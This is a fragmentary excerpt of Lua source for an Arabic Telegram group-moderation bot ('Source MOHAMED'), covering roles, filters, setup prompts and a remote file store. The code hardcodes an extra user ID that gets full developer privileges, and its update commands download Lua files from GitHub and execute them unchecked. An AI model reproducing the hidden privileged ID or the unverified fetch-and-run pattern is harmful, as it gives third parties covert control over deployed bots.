...
os.execute('lua ＭOHAMED.lua')
end
if not database:get(id_server..":MOHAMED:ID") then 
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
local MOHAMEDID = io.read() 
if MOHAMEDID ~= '' then 
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
database:set(id_server..":MOHAMED:ID",MOHAMEDID) 
else 
print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره') 
end  
os.execute('lua ＭOHAMED.lua') 
end
if not database:get(id_server..":MOHAMED:USERNAME") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local MOHAMEDUSERNAME = io.read():gsub('@','')
if MOHAMEDUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":MOHAMED:USERNAME",'@'..MOHAMEDUSERNAME)
else
...
MOHAMED = database:get(id_server..":MOHAMED:ID"),
UserName = database:get(id_server..":MOHAMED:USERNAME"),
 }
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./ＭOHAMED.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S ＭOHAMED -X kill
screen -S ＭOHAMED ./ＭOHAMED
done
]])  
file:close() 
...
database:del(id_server..":MOHAMED:ID")
end  
...
MOHAMEDs = dofile("./Info.lua") 
MOHAMED = tonumber(MOHAMEDs.MOHAMED)
MOHAMED_users = {MOHAMED}
bot_id = MOHAMEDs.token:match("(%d+)")  
token = MOHAMEDs.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ＭOHAMEDTEAM/Files_ＭOHAMED/master/File_Bot/commands.lua") 
...
MOHAMED_users = {MOHAMED,1458090052}   
function MOHAMEDBot(msg)  
local ＭOHAMED = false  
for k,v in pairs(MOHAMED_users) do  
...
local hash = database:sismember(bot_id.."DEV:MOHAMED:T", msg.sender_user_id_) 
if hash or MOHAMEDBot(msg) then  
return true  
else  
return false  
end  
...
function MOHAMED(msg) 
local hash = database:sismember(bot_id..'MOHAMED:User', msg.sender_user_id_) 
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
function Hamo(msg)
local hash = database:sismember(bot_id..'Hamo'..msg.chat_id_, msg.sender_user_id_) 
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or Hamo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or BasicConstructor(msg) or Hamo(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or BasicConstructor(msg) or Constructor(msg) or Hamo(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Hamo(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or MOHAMEDBot(msg) or DevMOHAMED(msg) or MOHAMED(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or Hamo(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(MOHAMED) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."DEV:MOHAMED:T", user_id) then
var = true  
elseif database:sismember(bot_id..'MOHAMED:User', user_id) then
var = true  
elseif database:sismember(bot_id..'Hamo'..chat_id, user_id) then
var = true
...
var = 'البوت'
elseif database:sismember(bot_id..'MOHAMED:User', user_id) then
var = database:get(bot_id.."MOHAMED:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'Hamo'..chat_id, user_id) then
var = database:get(bot_id.."Hamo:Rd"..msg.chat_id_) or 'المالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "Configat_12")
...
local ＭOHAMED_Msg = ''  
if msgs < 100 then 
ＭOHAMED_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
ＭOHAMED_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
ＭOHAMED_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
ＭOHAMED_Msg = 'متفاعل' 
elseif msgs < 1200 then 
ＭOHAMED_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
ＭOHAMED_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
ＭOHAMED_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
ＭOHAMED_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
ＭOHAMED_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
ＭOHAMED_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
ＭOHAMED_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
ＭOHAMED_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
ＭOHAMED_Msg = 'رب التفاعل'  
end 
return ＭOHAMED_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceＭOHAMED(msg,data) -- بداية العمل
if msg then
...
tdcli_function ({ID = "ForwardMessages", chat_id_ = MOHAMED,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ❃∫ تم ارسال الملصق من ↓\n - '..Name
sendText(MOHAMED,Text,0,'md')
end 
end,nil) 
end,nil)
end
...
sendText(MOHAMED,Text,msg.id_/2097152/0.5,'md')
...
send(msg.chat_id_, msg.id_,ＭOHAMED_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf ＭOHAMED.lua')
os.execute('wget https://raw.githubusercontent.com/ＭOHAMEDTEAM/ＭOHAMED/master/ＭOHAMED.lua')
send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس محمد\n ❃∫ الاصدار » { 1.3v}')
dofile('ＭOHAMED.lua')  
end
if text == 'الاصدار ❃' and DevMOHAMED(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ اصدار سورس محمد \n ❃∫ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت ❃' and DevMOHAMED(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ [تحديثات البوت](t.me/Configat_12) \n ❃∫ [قناه السورس](t.me/Configat_12)')
end
...
local list = database:smembers(bot_id..'MOHAMED:User')
t = "\n ❃∫ قائمة المطورين \n≪━━━━━━𝗠𝗢━━━━━━≫\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,'❃∫  عدد الجروبات الان » { '..#group..' }'..ＭOHAMEDk..''..ＭOHAMED..'\n❃∫  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
database:sadd(bot_id..'MOHAMED:User', result.id_)
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
database:sadd(bot_id..'MOHAMED:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'MOHAMED:User', result.id_)
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Configat_12')..')'
...
database:srem(bot_id..'MOHAMED:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم تنزيله من المطورين'
...
local ＭOHAMED1_Msg = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp2"..text..msg.chat_id_)   
if ＭOHAMED1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Configat_12')..') \n ❃∫ '..ＭOHAMED1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if ＭOHAMED_Msg and not Special(msg) then  
local ＭOHAMED_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if ＭOHAMED_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..ＭOHAMED_Msg.."] \n")
else
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/Configat_12)}\n ❃∫ ["..ＭOHAMED_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❃∫ عذرا » {["..data.first_name_.."](T.ME/Configat_12)}\n ❃∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'تفعيل' and MOHAMED(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'تعطيل' and MOHAMED(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'تفعيل' and not MOHAMED(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
sendText(msg.chat_id_,'\n ❃∫ بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ❃∫ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'Hamo'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
...
if text == "تفعيل الاضافات" and MOHAMEDBot(msg) then
send(msg.chat_id_, msg.id_, '❃∫ تم تفعيل الاضافات')
database:set(bot_id.."AL:Sre:stats","✔")
end
if text == "تعطيل الاضافات" and MOHAMEDBot(msg) then
...
database:sadd(bot_id.."ＭOHAMED:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."ＭOHAMED:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_ＭOHAMED = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_ＭOHAMED then 
names_ＭOHAMED = database:smembers(bot_id.."ＭOHAMED:blocname"..msg.chat_id_) or ""
if names_ＭOHAMED and names_ＭOHAMED[1] then 
for i=1,#names_ＭOHAMED do 
if name_ＭOHAMED:match("(.*)("..names_ＭOHAMED[i]..")(.*)") then 
...
database:set(bot_id.."ＭOHAMED:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."ＭOHAMED:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."ＭOHAMED:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."ＭOHAMED:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."ＭOHAMED:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_ＭOHAMEDa_new(ＭOHAMED1,ＭOHAMED2)
if ＭOHAMED2 and ＭOHAMED2.first_name_ then 
if ＭOHAMED2.first_name_:match("(.*)"..database:get(bot_id.."ＭOHAMED:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."ＭOHAMED:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local ＭOHAMED_nnn = database:get(bot_id.."ＭOHAMED:nump"..msg.chat_id_) or 5
local ＭOHAMED_nnn2 = database:get(bot_id.."ＭOHAMED:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(ＭOHAMED_nnn2) == tonumber(ＭOHAMED_nnn) or tonumber(ＭOHAMED_nnn2) > tonumber(ＭOHAMED_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."ＭOHAMED:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "❃∫ عزيزي >>["..ＭOHAMED2.username_.."](https://t.me/"..(ＭOHAMED2.username_ or "Configat_12")..")\n❃∫ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."ＭOHAMED:teh"..msg.chat_id_).."} بجانب اسمك\n❃∫ عدد المحاولات المتبقيه {"..(tonumber(ＭOHAMED_nnn) - tonumber(ＭOHAMED_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_ＭOHAMEDa_new)
end
end
...
local ＭOHAMEDChengName = database:get(bot_id.."ＭOHAMED:Cheng:Name"..data.id_)
if not data.first_name_ then 
if ＭOHAMEDChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..ＭOHAMEDChengName..']')
database:del(bot_id.."ＭOHAMED:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if ＭOHAMEDChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."ＭOHAMED:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local ＭOHAMEDChengUserName = database:get(bot_id.."ＭOHAMED:Cheng:UserName"..data.id_)
if not data.username_ then 
if ＭOHAMEDChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..ＭOHAMEDChengUserName..']')
database:del(bot_id.."ＭOHAMED:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if ＭOHAMEDChengUserName ~= data.username_ then 
local Text = {
'ليه غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
"هاها ليه  غيرت معرفك بس لا هددتك/ج الحب",
"مالها  ليه  غيرت معرفك 😐🌝",
"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
'ها عار مو جان معرفك \n ليه غيرته ل @'..data.username_..' ',
'ها يول ليه  مغير معرفك بيش مشتري يول', 
"منور معرف جديد :  "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."ＭOHAMED:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local ＭOHAMEDChengPhoto = database:get(bot_id.."ＭOHAMED:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if ＭOHAMEDChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."ＭOHAMED:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if ＭOHAMEDChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "ليه غيرت صورتك يلصاك",
  "منور طالع حلو ع صوره جديده",
  "ها يول ليه  غيرت صورتك😍😂",
  "ليه غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
  "ليه  غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
  "ليه غيرت الصوره مالها  ؟؟ 🤔🌞",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."ＭOHAMED:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
Text = [[
  ...
  ↬ .ＭOHAMED TEAM  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
  ↬ . [Channel](t.me/Configat_12)  
  
  ↬ . [DEVELOPER](t.me/M_W_12)       
   
  ↬ . [Information](t.me/Configat_12) 
...
if text == 'السيرفر' and MOHAMEDBot(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Configat_12')..') \n ❃∫ تـم قفـل الدردشه ')
end,nil)   
...
if text == 'تفعيل all' and Hamo(msg) then   
...
if text == 'تعطيل all' and Hamo(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Configat_12')..') \n ❃∫ تـم قفـل التاك بالكتم ')
end,nil)   
...
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(MOHAMED) then
...
if result.id_ == tonumber(MOHAMED) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر المطور الاساسي \n")
return false 
end
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Configat_12')..')'
...
if userid == tonumber(MOHAMED) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر المطور الاساسي \n")
return false 
end
...
database:del(bot_id..'MOHAMED:User')
...
if text == "تاك للمشرفين" and Hamo(msg) then
...
if DevMOHAMED(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ＭOHAMEDTEAM/Files_ＭOHAMED/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❃∫ اهلا بك في متجر ملفات محمد\n ❃∫ ملفات السورس ↓\n≪━━━━━━𝗠𝗢━━━━━━≫\n\n"
local TextE = "\n≪━━━━━━𝗠𝗢━━━━━━≫\n ❃∫ علامة تعني { ✓ } ملف مفعل\n ❃∫ علامة تعني { ✘ } ملف معطل\n ❃∫ قناة سورس محمد ↓\n".." ❃∫ [اضغط هنا لدخول](t.me/Configat_12) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ＭOHAMEDTEAM/Files_ＭOHAMED/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('ＭOHAMED.lua')  
else
send(msg.chat_id_, msg.id_," ❃∫ عذرا الملف لايدعم سورس محمد \n") 
end
return false
end
...
database:sadd(bot_id..'MOHAMED:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
...
function start_function(extra, result, success)
database:srem(bot_id..'MOHAMED:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
...
if text == ("مسح قائمه المالك") and MOHAMED(msg) then
database:del(bot_id..'Hamo'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ❃∫ تم مسح قائمه المالك')
return false
end

if text == 'قائمه المالك' and MOHAMED(msg) then
local list = database:smembers(bot_id..'Hamo'..msg.chat_id_)
t = "\n ❃∫ قائمه المالك \n≪━━━━━━𝗠𝗢━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
if text == ("رفع مالك") and msg.reply_to_message_id_ and MOHAMED(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:sadd(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
...
if text and text:match("^رفع مالك @(.*)$") and MOHAMED(msg) then
...
database:sadd(bot_id..'Hamo'..msg.chat_id_, result.id_)
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مالك'
texts = usertext..status
else
...
if text and text:match("^رفع مالك (%d+)$") and MOHAMED(msg) then
...
database:sadd(bot_id..'Hamo'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم ترقيته مالك'
...
if text == ("تنزيل مالك") and msg.reply_to_message_id_ and MOHAMED(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:srem(bot_id..'Hamo'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
...
if text and text:match("^تنزيل مالك @(.*)$") and MOHAMED(msg) then
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Hamo'..msg.chat_id_, result.id_)
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Configat_12')..')'
status  = '\n ❃∫ تم تنزيله من المالكين'
texts = usertext..status
else
...
if text and text:match("^تنزيل مالك (%d+)$") and MOHAMED(msg) then
...
database:srem(bot_id..'Hamo'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم تنزيله من المالكين'
...
------------------------------------------------------------------------
if text == ("مسح الاساسين") and Hamo(msg) then
...
if text == 'المنشئين الاساسين' and Hamo(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
...
if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and Hamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع منشئ اساسي @(.*)$") and Hamo(msg) then
...
if text and text:match("^رفع منشئ اساسي (%d+)$") and Hamo(msg) then
...
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and Hamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and Hamo(msg) then
...
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and Hamo(msg) then
...
local UserName = (b.username_ or "Configat_12")
...
if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and MOHAMEDBot(msg) then
function Function_ＭOHAMED(extra, result, success)
database:sadd(bot_id.."DEV:MOHAMED:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","❃∫ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_ＭOHAMED, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and MOHAMEDBot(msg) then
...
database:sadd(bot_id.."DEV:MOHAMED:T", result.id_)
Reply_Status(msg,result.id_,"reply","❃∫ تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"❃∫ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_ＭOHAMED, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي (%d+)$") and MOHAMEDBot(msg) then
local userid = text:match("^رفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."DEV:MOHAMED:T", userid)
Reply_Status(msg,userid,"reply","❃∫ تم ترقيته مطور ثانوي في البوت")  
return false 
end
if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and MOHAMEDBot(msg) then
function Function_ＭOHAMED(extra, result, success)
database:srem(bot_id.."DEV:MOHAMED:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","❃∫ تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_ＭOHAMED, nil)
return false 
end
if text and text:match("^تنزيل مطور ثانوي @(.*)$") and MOHAMEDBot(msg) then
local username = text:match("^تنزيل مطور ثانوي @(.*)$")
function Function_ＭOHAMED(extra, result, success)
if result.id_ then
database:srem(bot_id.."DEV:MOHAMED:T", result.id_)
...
if text and text:match("^تنزيل مطور ثانوي (%d+)$") and MOHAMEDBot(msg) then
local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
database:srem(bot_id.."DEV:MOHAMED:T", userid)
Reply_Status(msg,userid,"reply","❃∫ تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانويين") and MOHAMEDBot(msg) then
local list = database:smembers(bot_id.."DEV:MOHAMED:T")
...
if text == ("مسح الثانويين") and MOHAMEDBot(msg) then
database:del(bot_id.."DEV:MOHAMED:T")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
status  = '\n ❃∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ❃∫ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Configat_12')..')'
...
if not database:get(bot_id..'Reply:MOHAMED'..msg.chat_id_) then
rdMOHAMED = '✓'
else
rdMOHAMED = '✘'
end
...
local Configat_12 = database:get(bot_id..'Configat_12')
if Configat_12 then 
send(msg.chat_id_, msg.id_,Configat_12)
else
tdcli_function ({ID = "GetUser",user_id_ = MOHAMED},function(arg,result) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
...
database:set(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ❃∫ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."ＭOHAMED1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."ＭOHAMED1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ❃∫ تم منع الكلمه مع التحذير")  
database:del(bot_id.."ＭOHAMED1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."ＭOHAMED1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
